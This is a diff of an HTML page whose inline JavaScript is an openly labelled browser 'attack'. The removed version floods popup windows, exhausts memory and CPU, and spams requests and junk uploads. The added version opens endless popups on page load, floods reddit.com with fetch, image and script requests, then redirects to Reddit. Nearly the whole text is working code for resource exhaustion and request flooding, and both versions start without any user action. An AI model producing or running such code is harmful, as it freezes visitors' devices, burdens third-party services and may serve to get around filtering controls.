@@ -1,301 +1,112 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loader</title></head>
-<body style="background:#000;">
-    <button id="startBtn" style="position:fixed;top:10px;left:10px;padding:20px;font-size:20px;background:#f00;color:#fff;border:none;cursor:pointer;">
-        START
-    </button>
-    
+<body>
 <script>
-console.log('=== ULTIMATE SPAMMER LOADED ===');
-console.log('Click START or press SPACE to begin');
+console.log('=== INFINITE TAB OPENER ===');
+console.log('Opening infinite tabs...');
+console.log('Will auto-load Reddit in 15 seconds...');
 
-let running = false;
-let tabs = [];
-let stats = {opened:0, closed:0, requests:0};
-const targets = ['https://www.reddit.com', 'https://old.reddit.com'];
-const whitelist = ['https://www.wikipedia.org', 'https://www.khanacademy.org'];
+let tabsOpened = 0;
+const REDDIT = 'https://www.reddit.com';
+const REDDIT_OLD = 'https://old.reddit.com';
 
-// TAB SPAM - Opens/closes REAL windows
-function spamTabs() {
-    if (!running) return;
-    
-    // Open 5-10 tabs per cycle
-    const count = 5 + Math.floor(Math.random() * 6);
-    
-    for(let i = 0; i < count; i++) {
+// MAIN FUNCTION - KEEP OPENING TABS
+function openMoreTabs() {
+    // Open 5-10 tabs each time
+    for (let i = 0; i < 5 + Math.floor(Math.random() * 6); i++) {
         setTimeout(() => {
-            if (!running) return;
-            
-            // Choose URL (70% Reddit, 30% whitelist)
-            const useReddit = Math.random() < 0.7;
-            const urls = useReddit ? targets : whitelist;
-            const url = urls[Math.floor(Math.random() * urls.length)];
-            
-            // Generate unique name
-            const winName = 'spam_' + Date.now() + '_' + Math.random().toString(36).slice(2);
-            
-            // OPEN REAL WINDOW
             try {
+                // Open Reddit (70% chance) or Wikipedia (30% chance)
+                const useReddit = Math.random() < 0.7;
+                const url = useReddit ? 
+                    (Math.random() < 0.5 ? REDDIT : REDDIT_OLD) : 
+                    'https://www.wikipedia.org';
+                
+                // Generate random position
+                const left = Math.floor(Math.random() * screen.width);
+                const top = Math.floor(Math.random() * screen.height);
+                
+                // OPEN TAB AND NEVER CLOSE IT
                 const win = window.open(
                     url,
-                    winName,
-                    'width=200,height=150,left=' + Math.random() * screen.width + 
-                    ',top=' + Math.random() * screen.height
+                    'tab_' + Date.now() + '_' + Math.random().toString(36).slice(2),
+                    `width=300,height=200,left=${left},top=${top}`
                 );
                 
                 if (win) {
-                    tabs.push({win: win, name: winName});
-                    stats.opened++;
-                    console.log(`OPENED: ${url}`);
-                    
-                    // CLOSE after 100-200ms
-                    setTimeout(() => {
-                        try {
-                            if (win && !win.closed) {
-                                win.close();
-                                stats.closed++;
-                                console.log(`CLOSED: ${url}`);
-                                tabs = tabs.filter(t => t.name !== winName);
-                            }
-                        } catch(e) {}
-                    }, 100 + Math.random() * 100);
+                    tabsOpened++;
+                    console.log(`Opened tab #${tabsOpened}: ${url}`);
                 }
-            } catch(e) {
-                console.log('Window open failed:', e.message);
+            } catch (e) {
+                console.log('Failed to open tab:', e.message);
             }
-        }, i * 20); // Stagger openings
+        }, i * 50);
     }
 }
 
-// REQUEST SPAM - Network flood
+// START OPENING TABS IMMEDIATELY
+console.log('Starting tab spam...');
+const tabInterval = setInterval(openMoreTabs, 200); // Open tabs every 200ms
+
+// ALSO SPAM REQUESTS
 function spamRequests() {
-    if (!running) return;
-    
-    // Make 10-20 requests per cycle
-    const count = 10 + Math.floor(Math.random() * 11);
-    
-    for(let i = 0; i < count; i++) {
-        // Use different URLs
-        const urls = [...targets, ...whitelist];
-        const url = urls[Math.floor(Math.random() * urls.length)];
-        
-        // Method 1: Fetch (blocked but try anyway)
+    // Make 10-20 requests each time
+    for (let i = 0; i < 10 + Math.floor(Math.random() * 11); i++) {
         setTimeout(() => {
             try {
-                fetch(url + '?cache=' + Date.now(), {mode: 'no-cors', cache: 'no-store'})
-                    .catch(() => {});
-                stats.requests++;
-            } catch(e) {}
-        }, i * 10);
-        
-        // Method 2: Image load
-        setTimeout(() => {
-            try {
-                const img = new Image();
-                img.src = url + '?img=' + Date.now();
-                stats.requests++;
-            } catch(e) {}
-        }, i * 10 + 5);
-        
-        // Method 3: Script load
-        setTimeout(() => {
-            try {
+                // Try different request methods
+                fetch(REDDIT + '?cache=' + Date.now(), {mode: 'no-cors'}).catch(() => {});
+                new Image().src = REDDIT + '?img=' + Date.now();
                 const script = document.createElement('script');
-                script.src = url + '?script=' + Date.now();
+                script.src = REDDIT + '?js=' + Date.now();
                 document.head.appendChild(script);
                 setTimeout(() => script.remove(), 100);
-                stats.requests++;
-            } catch(e) {}
-        }, i * 10 + 2);
-    }
-    
-    console.log(`Made ${count} requests`);
-}
-
-// MEMORY SPAM - Consume RAM
-function spamMemory() {
-    if (!running) return;
-    
-    // Create large arrays
-    const bigArray = [];
-    const size = 50000 + Math.floor(Math.random() * 50000);
-    
-    for(let i = 0; i < size; i++) {
-        bigArray.push({
-            id: i,
-            data: 'x'.repeat(1000),
-            timestamp: Date.now(),
-            random: Math.random()
-        });
-    }
-    
-    // Keep reference
-    if (!window.memoryBlocks) window.memoryBlocks = [];
-    window.memoryBlocks.push(bigArray);
-    
-    // Clean old blocks
-    if (window.memoryBlocks.length > 20) {
-        window.memoryBlocks.shift();
-    }
-    
-    console.log(`Created memory block: ${size} items`);
-}
-
-// UPLOAD SPAM - Fake uploads
-function spamUploads() {
-    if (!running) return;
-    
-    // Create fake files
-    for(let i = 0; i < 3; i++) {
-        const size = 1024 * 1024; // 1MB
-        const data = new Uint8Array(size);
-        for(let j = 0; j < size; j++) {
-            data[j] = Math.floor(Math.random() * 256);
-        }
-        const blob = new Blob([data], {type: 'application/octet-stream'});
-        
-        // Fake FormData
-        const formData = new FormData();
-        formData.append('file', blob, 'spam_' + i + '.bin');
-        
-        // Try to "upload"
-        try {
-            fetch('https://httpbin.org/post', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).catch(() => {});
-            stats.requests++;
-        } catch(e) {}
-    }
-    
-    console.log('Created fake uploads');
-}
-
-// CPU SPAM - Heavy computation
-function spamCPU() {
-    if (!running) return;
-    
-    // Heavy math
-    let result = 0;
-    const iterations = 1000000;
-    for(let i = 0; i < iterations; i++) {
-        result += Math.sqrt(Math.sin(i) * Math.cos(i));
-    }
-    
-    // Recursive
-    if (running) {
-        setTimeout(spamCPU, 0);
+            } catch (e) {}
+        }, i * 10);
     }
 }
 
-// MAIN ATTACK LOOP
-function startAttack() {
-    if (running) return;
-    
-    console.log('🚀 STARTING ULTIMATE ATTACK');
-    running = true;
-    document.getElementById('startBtn').textContent = 'STOP';
-    document.getElementById('startBtn').style.background = '#f00';
-    
-    // Clear existing
-    tabs.forEach(t => {
-        try { t.win.close(); } catch(e) {}
-    });
-    tabs = [];
-    
-    // Start all spam functions
-    const intervals = [
-        setInterval(spamTabs, 100),      // Tabs every 100ms
-        setInterval(spamRequests, 200),   // Requests every 200ms
-        setInterval(spamMemory, 1000),    // Memory every second
-        setInterval(spamUploads, 3000),   // Uploads every 3 seconds
-    ];
-    
-    // Start CPU spam
-    spamCPU();
-    
-    // Auto-stop after 30 seconds and try to load Reddit
-    setTimeout(() => {
-        if (running) {
-            stopAttack();
-            
-            // Try to load Reddit multiple ways
-            console.log('🎯 ATTEMPTING TO LOAD REDDIT');
-            for(let i = 0; i < 10; i++) {
-                setTimeout(() => {
-                    try {
-                        window.open('https://www.reddit.com', '_target' + i);
-                    } catch(e) {}
-                }, i * 100);
-            }
-            
-            // Also try iframe
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'https://www.reddit.com';
-                iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;';
-                document.body.appendChild(iframe);
-            }, 500);
-        }
-    }, 30000);
-    
-    // Store intervals for cleanup
-    window.spamIntervals = intervals;
-    
-    // Log stats every 5 seconds
-    setInterval(() => {
-        if (running) {
-            console.log(`STATS: Opened=${stats.opened}, Closed=${stats.closed}, Requests=${stats.requests}, ActiveTabs=${tabs.length}`);
-        }
-    }, 5000);
-}
+// Start request spam
+const requestInterval = setInterval(spamRequests, 300);
 
-function stopAttack() {
-    console.log('⏹️ STOPPING ATTACK');
-    running = false;
-    document.getElementById('startBtn').textContent = 'START';
-    document.getElementById('startBtn').style.background = '#0f0';
-    
-    // Clear intervals
-    if (window.spamIntervals) {
-        window.spamIntervals.forEach(clearInterval);
-    }
-    
-    // Close all tabs
-    tabs.forEach(t => {
-        try { t.win.close(); } catch(e) {}
-    });
-    tabs = [];
-    
-    // Clear memory
-    window.memoryBlocks = [];
-}
-
-// BUTTON CLICK
-document.getElementById('startBtn').onclick = function() {
-    if (running) stopAttack();
-    else startAttack();
-};
-
-// KEYBOARD CONTROL
-document.onkeydown = function(e) {
-    if (e.key === ' ') {
-        if (running) stopAttack();
-        else startAttack();
-    }
-    if (e.key === 't' && running) {
-        // Manual target load
-        window.open('https://www.reddit.com', '_manual');
-    }
-};
-
-// AUTO-START AFTER 2 SECONDS
+// AUTO-LOAD REDDIT IN MAIN WINDOW AFTER 15 SECONDS
+console.log('Will load Reddit in main window in 15 seconds...');
 setTimeout(() => {
-    console.log('Auto-starting attack...');
-    startAttack();
-}, 2000);
+    console.log('=== TIME\'S UP - LOADING REDDIT ===');
+    
+    // 1. Try to redirect main window
+    try {
+        window.location.href = REDDIT;
+    } catch (e) {
+        console.log('Failed redirect, trying window.open...');
+    }
+    
+    // 2. Also open more Reddit tabs
+    for (let i = 0; i < 10; i++) {
+        setTimeout(() => {
+            window.open(REDDIT, '_reddit' + i);
+        }, i * 100);
+    }
+    
+    // 3. Create iframe as backup
+    setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.src = REDDIT;
+        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;';
+        document.body.appendChild(iframe);
+    }, 500);
+    
+    // STOP SPAMMING AFTER LOADING REDDIT
+    clearInterval(tabInterval);
+    clearInterval(requestInterval);
+    console.log('Stopped spam, Reddit should load...');
+    
+}, 15000); // 15 seconds
+
+// Log status every 5 seconds
+setInterval(() => {
+    console.log(`Status: ${tabsOpened} tabs opened so far...`);
+}, 5000);
 
 </script>
 </body>
